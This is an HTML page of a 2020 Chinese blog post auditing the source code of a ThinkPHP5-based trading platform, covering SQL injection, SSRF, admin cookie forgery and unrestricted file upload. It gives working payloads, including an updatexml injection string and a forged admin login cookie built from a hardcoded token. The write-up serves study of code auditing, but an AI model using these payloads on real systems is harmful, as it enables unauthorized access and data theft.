@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hackedsb.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言：在资源搜索网盘下载到了这套源码，决定拿它练下手分析一下代码的逻辑，加深对一些常见漏洞的理解。如果有什么不对的地方，欢迎师傅们指出。源码是基于thinkphp5+mysql开发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某微盘源码审计">
+<meta property="og:url" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Art1st&#39;s blog">
+<meta property="og:description" content="前言：在资源搜索网盘下载到了这套源码，决定拿它练下手分析一下代码的逻辑，加深对一些常见漏洞的理解。如果有什么不对的地方，欢迎师傅们指出。源码是基于thinkphp5+mysql开发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-1.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-3.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-4.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-5.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-6.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-7.png">
+<meta property="og:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-8.png">
+<meta property="article:published_time" content="2020-09-07T07:18:46.000Z">
+<meta property="article:modified_time" content="2020-09-07T07:49:39.041Z">
+<meta property="article:author" content="Art1st">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-1.png">
+
+<link rel="canonical" href="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>某微盘源码审计 | Art1st's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Art1st's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hackedsb.github.io/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Art1st">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Art1st's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          某微盘源码审计
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-07 15:18:46 / 修改时间：15:49:39" itemprop="dateCreated datePublished" datetime="2020-09-07T15:18:46+08:00">2020-09-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在资源搜索网盘下载到了这套源码，决定拿它练下手<br>分析一下代码的逻辑，加深对一些常见漏洞的理解。如果有什么不对的地方，欢迎师傅们指出。<br>源码是基于thinkphp5+mysql开发</p>
+<a id="more"></a>
+<h1 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h1><p>漏洞位置 \application\index\controller\Goods.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function ajaxkdata()</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;获取k线图数据，转化为array</span><br><span class="line">        </span><br><span class="line">		$pid &#x3D; input(&#39;param.pid&#39;);</span><br><span class="line">        $data &#x3D; Db::name(&#39;productdata&#39;)-&gt;where(&#39;pid&#x3D;&#39;.$pid)-&gt;find();</span><br><span class="line">       	$newdata &#x3D; array();</span><br><span class="line">        if($data)&#123;</span><br><span class="line">            $data[&#39;UpdateTime&#39;] &#x3D; $data[&#39;UpdateTime&#39;];</span><br><span class="line">            $newdata[0][&#39;price&#39;] &#x3D; $data[&#39;Price&#39;];</span><br><span class="line">            $newdata[0][&#39;open&#39;] &#x3D; $data[&#39;Open&#39;];</span><br><span class="line">            $newdata[0][&#39;close&#39;] &#x3D; $data[&#39;Close&#39;];</span><br><span class="line">            $newdata[0][&#39;lowest&#39;] &#x3D; $data[&#39;Low&#39;];</span><br><span class="line">            $newdata[0][&#39;highest&#39;] &#x3D; $data[&#39;High&#39;];</span><br><span class="line">            $newdata[0][&#39;time&#39;] &#x3D; $data[&#39;UpdateTime&#39;].&#39;000&#39;;</span><br><span class="line">            $newdata[0][&#39;fulltime&#39;] &#x3D; date(&#39;Y-m-d H:i:s&#39;,$data[&#39;UpdateTime&#39;]);</span><br><span class="line">            $newdata[0][&#39;goodtime&#39;] &#x3D; date(&#39;Y-m-d H:i:s&#39;,$data[&#39;UpdateTime&#39;]);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $newdata;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$pid变量用input，拼接进了where查询，造成注入</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;xxxx&#96; WHERE ( pid&#x3D;1) and updatexml(1,concat(0x7e,user(),0x7e),1) # ) LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-1.png" alt="image-1.png.png"></p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>漏洞位置 \application\index\controller\Api.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function post_curl($url,$data)&#123;</span><br><span class="line">  $ch &#x3D; curl_init($url);</span><br><span class="line">  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, &quot;POST&quot;);</span><br><span class="line">  curl_setopt($ch, CURLOPT_POSTFIELDS,$data);</span><br><span class="line">  curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);</span><br><span class="line">  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);</span><br><span class="line">  $result &#x3D; curl_exec($ch);</span><br><span class="line">  if (curl_errno($ch)) &#123;</span><br><span class="line">  	print curl_error($ch);</span><br><span class="line">  &#125;</span><br><span class="line">  curl_close($ch);</span><br><span class="line">  return $result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这是典型的SSRF漏洞，代码没有过滤将传入的url值带入curl_exec函数造成SSRF</p>
+<p>漏洞验证：<br><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2.png" alt="image-1.png.png"></p>
+<h1 id="管理后台登录凭证伪造"><a href="#管理后台登录凭证伪造" class="headerlink" title="管理后台登录凭证伪造"></a>管理后台登录凭证伪造</h1><p>漏洞位置 \application\admin\controller\Base.php</p>
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-3.png" alt="image-1.png.png"></p>
+<p>可以看到先是判断有没userid值，然后判断token是不是’nimashabi’用MD5加密的值</p>
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-4.png" alt="image-1.png.png"></p>
+<p>这里在检测otype是否等于3</p>
+<p>otype userid的值可以在数据库中得到，这样就可以构造COOKIE进行登录后台</p>
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-5.png" alt="image-1.png.png"></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">think_var&#x3D;zh-cn;denglu&#x3D;think:&#123;&quot;otype&quot;:&quot;3&quot;,&quot;userid&quot;:&quot;1&quot;,&quot;token&quot;:&quot;3c341b110c44ad9e7da4160e4f865b63&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-6.png" alt="image-1.png.png"></p>
+<h1 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h1><p>漏洞位置 \application\admin\controller\Setup.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> public function editconf()</span><br><span class="line">  &#123;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">if($this-&gt;otype !&#x3D; 3)&#123;</span><br><span class="line">	echo &#39;死你全家!&#39;;exit;</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line">      if(input(&#39;post.&#39;))&#123;</span><br><span class="line"></span><br><span class="line">          $data &#x3D; input(&#39;post.&#39;);</span><br><span class="line"></span><br><span class="line">          foreach ($data as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">              $arr &#x3D; explode(&#39;_&#39;,$k);</span><br><span class="line">              $_data[&#39;id&#39;] &#x3D; $arr[1];</span><br><span class="line">              $_data[&#39;value&#39;] &#x3D; $v;</span><br><span class="line">              $file &#x3D; request()-&gt;file(&#39;pic_&#39;.$_data[&#39;id&#39;]);</span><br><span class="line">              </span><br><span class="line">              if($file)&#123;</span><br><span class="line">                  </span><br><span class="line">                  $info &#x3D; $file-&gt;move(ROOT_PATH . &#39;public&#39; . DS . &#39;uploads&#39;);</span><br><span class="line">                  if($info)&#123;</span><br><span class="line">                      $_data[&#39;value&#39;] &#x3D; &#39;&#x2F;public&#39; . DS . &#39;uploads&#x2F;&#39;.$info-&gt;getSaveName();</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              if($_data[&#39;value&#39;] &#x3D;&#x3D; &#39;&#39; &amp;&amp; isset($arr[2]) &amp;&amp; $arr[2] &#x3D;&#x3D; 3)&#123;</span><br><span class="line">                  continue;</span><br><span class="line">              &#125;</span><br><span class="line">              </span><br><span class="line">              Db::name(&#39;config&#39;)-&gt;update($_data);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">          cache(&#39;conf&#39;,null);</span><br><span class="line">          $this-&gt;success(&#39;编辑成功&#39;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进file()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">public function file($name &#x3D; &#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($this-&gt;file)) &#123;</span><br><span class="line">            $this-&gt;file &#x3D; isset($_FILES) ? $_FILES : [];</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_array($name)) &#123;</span><br><span class="line">            return $this-&gt;file &#x3D; array_merge($this-&gt;file, $name);</span><br><span class="line">        &#125;</span><br><span class="line">        $files &#x3D; $this-&gt;file;</span><br><span class="line">        if (!empty($files)) &#123;</span><br><span class="line">            &#x2F;&#x2F; 处理上传文件</span><br><span class="line">            $array &#x3D; [];</span><br><span class="line">            foreach ($files as $key &#x3D;&gt; $file) &#123;</span><br><span class="line">                if (is_array($file[&#39;name&#39;])) &#123;</span><br><span class="line">                    $item  &#x3D; [];</span><br><span class="line">                    $keys  &#x3D; array_keys($file);</span><br><span class="line">                    $count &#x3D; count($file[&#39;name&#39;]);</span><br><span class="line">                    for ($i &#x3D; 0; $i &lt; $count; $i++) &#123;</span><br><span class="line">                        if (empty($file[&#39;tmp_name&#39;][$i]) || !is_file($file[&#39;tmp_name&#39;][$i])) &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                        $temp[&#39;key&#39;] &#x3D; $key;</span><br><span class="line">                        foreach ($keys as $_key) &#123;</span><br><span class="line">                            $temp[$_key] &#x3D; $file[$_key][$i];</span><br><span class="line">                        &#125;</span><br><span class="line">                        $item[] &#x3D; (new File($temp[&#39;tmp_name&#39;]))-&gt;setUploadInfo($temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                    $array[$key] &#x3D; $item;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if ($file instanceof File) &#123;</span><br><span class="line">                        $array[$key] &#x3D; $file;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        if (empty($file[&#39;tmp_name&#39;]) || !is_file($file[&#39;tmp_name&#39;])) &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                        $array[$key] &#x3D; (new File($file[&#39;tmp_name&#39;]))-&gt;setUploadInfo($file);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (strpos($name, &#39;.&#39;)) &#123;</span><br><span class="line">                list($name, $sub) &#x3D; explode(&#39;.&#39;, $name);</span><br><span class="line">            &#125;</span><br><span class="line">            if (&#39;&#39; &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">                &#x2F;&#x2F; 获取全部文件</span><br><span class="line">                return $array;</span><br><span class="line">            &#125; elseif (isset($sub) &amp;&amp; isset($array[$name][$sub])) &#123;</span><br><span class="line">                return $array[$name][$sub];</span><br><span class="line">            &#125; elseif (isset($array[$name])) &#123;</span><br><span class="line">                return $array[$name];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到处理上传文件并没有过滤，最终上传的文件move到/public/uploads/目录下。</p>
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-7.png" alt="image-1.png.png"></p>
+<p><img src="/2020/09/07/%E6%9F%90%E5%BE%AE%E7%9B%98%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/image-8.png" alt="image-1.png.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/18/MSSQL%E4%BD%BF%E7%94%A8CLR%E7%A8%8B%E5%BA%8F%E9%9B%86%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" rel="prev" title="MSSQL使用CLR程序集来执行命令">
+      <i class="fa fa-chevron-left"></i> MSSQL使用CLR程序集来执行命令
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前台SQL注入"><span class="nav-number">2.</span> <span class="nav-text">前台SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">3.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#管理后台登录凭证伪造"><span class="nav-number">4.</span> <span class="nav-text">管理后台登录凭证伪造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后台任意文件上传"><span class="nav-number">5.</span> <span class="nav-text">后台任意文件上传</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Art1st"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Art1st</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://xuan4.top/" title="http:&#x2F;&#x2F;xuan4.top" rel="noopener" target="_blank">Xuan</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Art1st</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
